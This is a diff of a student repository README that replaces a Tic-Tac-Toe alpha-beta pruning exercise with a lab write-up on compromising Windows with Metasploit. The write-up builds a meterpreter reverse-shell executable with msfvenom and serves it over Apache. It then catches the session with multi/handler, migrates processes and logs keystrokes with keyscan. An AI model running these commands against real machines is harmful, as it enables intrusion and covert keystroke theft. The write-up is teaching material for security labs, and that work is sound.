@@ -1,224 +1,172 @@
-<h1>ExpNo 7 : Implement Alpha-beta pruning of Minimax Search Algorithm for a Simple TIC-TAC-TOE game</h1> 
-<h3>Name:Dhanush S</h3>
-<h3>Register Number: 212221230020</h3>
-<H3>Aim:</H3
-<p>
-Implement Alpha-beta pruning of Minimax Search Algorithm for a Simple TIC-TAC-TOE game
-</p>
-<h1>GOALS of Alpha-Beta Pruning in MiniMax Search Algorithm</h1>
+# Compromising-windows-using-Metasploit
+Compromising windows using Metasploit
+# Metasploit
+Compromising windows using Metasploit
 
-<h3>Improve the decision-making efficiency of the computer player by reducing the number of evaluated nodes in the game tree.</h3>
-<h3>Tic-Tac-Toe game implementation incorporating the Alpha-Beta pruning and the Minimax algorithm with Python Code.</h3>
-<h1>IMPLEMENTATION</h1>
+# AIM:
 
-The project involves developing a Tic-Tac-Toe game implementation incorporating the Alpha-Beta pruning with the Minimax algorithm. Using this algorithm, the computer player analyzes the game state, evaluates possible moves, and selects the optimal action based on the anticipated outcomes.
+To Compromise windows using Metasploit .
 
-<h1>The Minimax algorithm</h1>
+## DESIGN STEPS:
 
-recursively evaluates all possible moves and their potential outcomes, creating a game tree.
+### Step 1:
 
-<h1>Alpha-Beta pruning</h1>
+Install kali linux either in partition or virtual box or in live mode
 
-Alpha–Beta (𝛼−𝛽) algorithm is actually an improved minimax using a heuristic. It stops evaluating a move when it makes sure that it’s worse than a previously examined move. Such moves need not to be evaluated further.
+### Step 2:
 
-When added to a simple minimax algorithm, it gives the same output but cuts off certain branches that can’t possibly affect the final decision — dramatically improving the performance
-## Program 
-~~~
-import time
+Investigate on the various categories of tools as follows:
 
-class Game:
-    def __init__(self):
-        self.initialize_game()
+### Step 3:
 
-    def initialize_game(self):
-        self.current_state = [['.','.','.'],
-                              ['.','.','.'],
-                              ['.','.','.']]
+Open terminal and try execute some kali linux commands
 
-        # Player X always plays first
-        self.player_turn = 'X'
+PROGRAM:
+Find the attackers ip address using ifconfig
+OUTPUT:
 
-    def draw_board(self):
-        for i in range(0, 3):
-            for j in range(0, 3):
-                print('{}|'.format(self.current_state[i][j]), end=" ")
-            print()
-        print()
-    def is_valid(self, px, py):
-        if px < 0 or px > 2 or py < 0 or py > 2:
-            return False
-        elif self.current_state[px][py] != '.':
-            return False
-        else:
-            return True
-    def is_end(self):
-    # Vertical win
-        for i in range(0, 3):
-            if (self.current_state[0][i] != '.' and
-                self.current_state[0][i] == self.current_state[1][i] and
-                self.current_state[1][i] == self.current_state[2][i]):
-                return self.current_state[0][i]
+![Screenshot 2024-04-28 123654](https://github.com/22008496/Compromising-windows-using-Metasploit/assets/119476113/b1b123a4-7669-4ca1-9ebd-795d420e1811)
 
-        # Horizontal win
-        for i in range(0, 3):
-            if (self.current_state[i] == ['X', 'X', 'X']):
-                return 'X'
-            elif (self.current_state[i] == ['O', 'O', 'O']):
-                return 'O'
+Create a malicious executable file fun.exe using msenom command
 
-    # Main diagonal win
-        if (self.current_state[0][0] != '.' and
-            self.current_state[0][0] == self.current_state[1][1] and
-            self.current_state[0][0] == self.current_state[2][2]):
-            return self.current_state[0][0]
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > malware.exe
 
-    # Second diagonal win
-        if (self.current_state[0][2] != '.' and
-            self.current_state[0][2] == self.current_state[1][1] and
-            self.current_state[0][2] == self.current_state[2][0]):
-            return self.current_state[0][2]
+OUTPUT:
 
-    # Is the whole board full?
-        for i in range(0, 3):
-            for j in range(0, 3):
-            # There's an empty field, we continue the game
-                if (self.current_state[i][j] == '.'):
-                    return None
+![Screenshot 2024-04-28 123805](https://github.com/22008496/Compromising-windows-using-Metasploit/assets/119476113/f5a37ea4-0eb2-48c5-8f56-5bb6cdd35de5)
 
-    # It's a tie!
-        return '.'
-    def max_alpha_beta(self, alpha, beta):
-        maxv = -2
-        px = None
-        py = None
+copy the malware.exe into the apache /var/www/html folder
 
-        result = self.is_end()
+![Screenshot 2024-04-28 123853](https://github.com/22008496/Compromising-windows-using-Metasploit/assets/119476113/3fb5186a-755a-4fd1-a084-b2d2ef22f827)
 
-        if result == 'X':
-            return (-1, 0, 0)
-        elif result == 'O':
-            return (1, 0, 0)
-        elif result == '.':
-            return (0, 0, 0)
+Start apache server
 
-        for i in range(0, 3):
-            for j in range(0, 3):
-                if self.current_state[i][j] == '.':
-                    self.current_state[i][j] = 'O'
-                    (m, min_i, in_j) = self.min_alpha_beta(alpha, beta)
-                    if m > maxv:
-                        maxv = m
-                        px = i
-                        py = j
-                    self.current_state[i][j] = '.'
+sudo systemctl apache2 start
 
-                    # Next two ifs in Max and Min are the only difference between regular algorithm and minimax
-                    if maxv >= beta:
-                        return (maxv, px, py)
+![Screenshot 2024-04-28 123955](https://github.com/22008496/Compromising-windows-using-Metasploit/assets/119476113/c7d742d5-955b-48a9-b759-bc185285d9db)
 
-                    if maxv > alpha:
-                        alpha = maxv
+Check the status of apache2
 
-        return (maxv, px, py)
+![Screenshot 2024-04-28 124100](https://github.com/22008496/Compromising-windows-using-Metasploit/assets/119476113/e78ca036-bbb6-453f-8f86-74ddce4fdb34)
 
-    def min_alpha_beta(self, alpha, beta):
+Invoke msfconsole:
 
-        minv = 2
+![Screenshot 2024-04-28 124215](https://github.com/22008496/Compromising-windows-using-Metasploit/assets/119476113/08e1fc5a-c2f0-455d-88fe-2fbcc9a0827b)
 
-        qx = None
-        qy = None
+OUTPUT:
+Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
 
-        result = self.is_end()
+Starting a command and control Server
 
-        if result == 'X':
-            return (-1, 0, 0)
-        elif result == 'O':
-            return (1, 0, 0)
-        elif result == '.':
-            return (0, 0, 0)
+use multi/handler
 
-        for i in range(0, 3):
-            for j in range(0, 3):
-                if self.current_state[i][j] == '.':
-                    self.current_state[i][j] = 'X'
-                    (m, max_i, max_j) = self.max_alpha_beta(alpha, beta)
-                    if m < minv:
-                        minv = m
-                        qx = i
-                        qy = j
-                    self.current_state[i][j] = '.'
+![Screenshot 2024-04-28 124255](https://github.com/22008496/Compromising-windows-using-Metasploit/assets/119476113/57c5d6bd-0b56-4856-abaf-20904a94ceb4)
 
-                    if minv <= alpha:
-                        return (minv, qx, qy)
+set PAYLOAD windows/meterpreter/reverse_tcp
 
-                    if minv < beta:
-                        beta = minv
+set LHOST 0.0.0.0
 
-        return (minv, qx, qy)
-    def play_alpha_beta(self):
-        while True:
-            self.draw_board()
-            self.result = self.is_end()
+exploit
 
-            if self.result != None:
-                if self.result == 'X':
-                    print('The winner is X!')
-                elif self.result == 'O':
-                    print('The winner is O!')
-                elif self.result == '.':
-                    print("It's a tie!")
+On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
+
+http://192.168.1.2/fun.exe
+
+The file "fun.exe" downloads.
+
+![Screenshot 2024-04-28 124342](https://github.com/22008496/Compromising-windows-using-Metasploit/assets/119476113/ff67ae0a-d557-4023-955d-daed09c56c17)
+
+Bypass any warning boxes, double-click the file, and allow it to run.
+
+On kali give the command exploit
+
+![Screenshot 2024-04-28 124427](https://github.com/22008496/Compromising-windows-using-Metasploit/assets/119476113/929d9d97-03d5-4268-80f1-e9a2c13589ff)
+
+To see a list of processes, at the meterpreter > prompt, execute this command:
+
+ps ⇒ can see the fun.exe process running with pid 1156
+
+![Screenshot 2024-04-28 124537](https://github.com/22008496/Compromising-windows-using-Metasploit/assets/119476113/b7150f2d-82fe-4e89-b468-b67ce9137f57)
+
+The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process.
+
+At the meterpreter > prompt, execute this command:
+
+migrate -N explorer.exe
+
+at meterpreter > prompt, execute this command:
+
+netstat
+
+A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
+
+Notice the "PID/Program name" value for this connection, which is redacted
+
+![Screenshot 2024-04-28 124632](https://github.com/22008496/Compromising-windows-using-Metasploit/assets/119476113/1a2ce2f0-ece5-40ed-8afd-0d33a02c7507)
+
+Post Exploitation
+
+The target is now owned. Following are meterpreter commands for key capturing in the target machine
+
+keyscan_start Begins capturing keys typed in the target.
+
+On the Windows target, open Notepad and type in some text, such as your name.
+
+![Screenshot 2024-04-28 124723](https://github.com/22008496/Compromising-windows-using-Metasploit/assets/119476113/4d4302cf-2752-4bbf-b716-474e382fe276)
+
+keyscan_dump Shows the keystrokes captured so far
+
+![Screenshot 2024-04-28 124812](https://github.com/22008496/Compromising-windows-using-Metasploit/assets/119476113/9c069abc-7f0e-4a6b-ad29-f4af8c53d2cf)
 
 
-                self.initialize_game()
-                return
-
-            if self.player_turn == 'X':
-
-                while True:
-                    start = time.time()
-                    (m, qx, qy) = self.min_alpha_beta(-2, 2)
-                    end = time.time()
-                    print('Evaluation time: {}s'.format(round(end - start, 7)))
-                    print('Recommended move: X = {}, Y = {}'.format(qx, qy))
-
-                    px = int(input('Insert the X coordinate: '))
-                    py = int(input('Insert the Y coordinate: '))
-
-                    qx = px
-                    qy = py
-
-                    if self.is_valid(px, py):
-                        self.current_state[px][py] = 'X'
-                        self.player_turn = 'O'
-                        break
-                    else:
-                        print('The move is not valid! Try again.')
-
-            else:
-                (m, px, py) = self.max_alpha_beta(-2, 2)
-                self.current_state[px][py] = 'O'
-                self.player_turn = 'X'
-    
-     
-    
-def main():
-    g = Game()
-    g.play_alpha_beta()
-
-if __name__ == "__main__":
-    main()
-~~~
-
-<hr>
-<h2>Sample Input and Output:</h2>
-
-![image](https://github.com/natsaravanan/19AI405FUNDAMENTALSOFARTIFICIALINTELLIGENCE/assets/87870499/8d5e329a-9aff-41a6-bcf0-46efa10e1b92)
-![image](https://github.com/natsaravanan/19AI405FUNDAMENTALSOFARTIFICIALINTELLIGENCE/assets/87870499/438b242d-54ba-443e-b040-a936e6ae3b55)
-![image](https://github.com/natsaravanan/19AI405FUNDAMENTALSOFARTIFICIALINTELLIGENCE/assets/87870499/99a33390-fa11-4ade-a19f-e93bcd7aaec9)
-![image](https://github.com/natsaravanan/19AI405FUNDAMENTALSOFARTIFICIALINTELLIGENCE/assets/87870499/440797bd-53cb-49c1-b18d-89776864c3e7)
-![image](https://github.com/natsaravanan/19AI405FUNDAMENTALSOFARTIFICIALINTELLIGENCE/assets/87870499/81575a16-26b2-46f1-a8ac-27c9ed0a0fe5)
- # Result
- Thus,Implementation of Alpha-beta pruning of Minimax Search Algorithm for a Simple TIC-TAC-TOE game was done successfully.
- 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+## RESULT:
+The Metasploit framework is  used to compromise windows and is examined successfully.
